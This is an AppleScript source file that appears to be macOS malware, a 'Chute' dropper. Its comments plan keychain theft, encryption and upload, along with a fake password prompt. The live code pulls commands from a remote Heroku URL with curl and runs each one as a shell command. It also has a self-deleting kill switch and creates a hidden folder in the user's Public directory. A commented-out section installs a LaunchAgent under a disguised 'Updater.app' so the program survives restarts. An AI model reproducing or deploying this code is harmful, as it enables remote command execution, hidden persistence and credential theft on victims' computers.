(* Chute

	Remote command
	Make folder
	Launch Agent
	Copy payload
	Does something to make the user happy	

*)

(* Payload

	Remote command
	Check if password has changed
		Prompt
			tell application "System Events" to keystroke "q" using {command down, option down, shift down}
		Record 
	Copy keychain
	Encrypt
	Upload

*)

set remoteURL to "http://damp-journey-2734.herokuapp.com/remote.txt"
try
	set commandArgs to paragraphs of (do shell script "curl " & remoteURL & " | cut -d ':' -f 2")

	if (item 1 of commandArgs) is "true" then -- Kill
		try
			do shell script "rm -rf " & quoted form of (POSIX path of (path to me))
		end try
		return
	else if (item 2 of commandArgs) is "true" then -- Hold
		return
	else
		if (count of commandArgs) > 2 then
			repeat with a from 3 to (count of commandArgs)
				try
					do shell script (item a of commandArgs) -- Run commands
				end try
			end repeat
		end if
	end if
on error
	return
end try

try
	set theuser to do shell script "whoami"
	try
		do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
	end try
	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
on error
	return
end try
(*
try
	set reso to quoted form of POSIX path of (path to resource "Updater.app")
	set newreso to POSIX path of ("" & ufld & "Updater.app")
	do shell script "cp -r " & reso & " " & newreso -- Copy duplicate app
	
	try
		do shell script "mkdir ~/Library/LaunchAgents/"
	end try
	set plistPath to "~/Library/LaunchAgents/com.h4k.plist"
	do shell script "touch " & plistPath -- Make a launchagent for startup
	log "new"
	do shell script "defaults write " & plistPath & " Label 'com.h4k.plist'"
	do shell script "defaults write " & plistPath & " Program '" & ufld & "Updater.app/Contents/MacOS/applet'"
	do shell script "defaults write " & plistPath & " RunAtLoad -bool true"
	do shell script "launchctl load "
end try
*)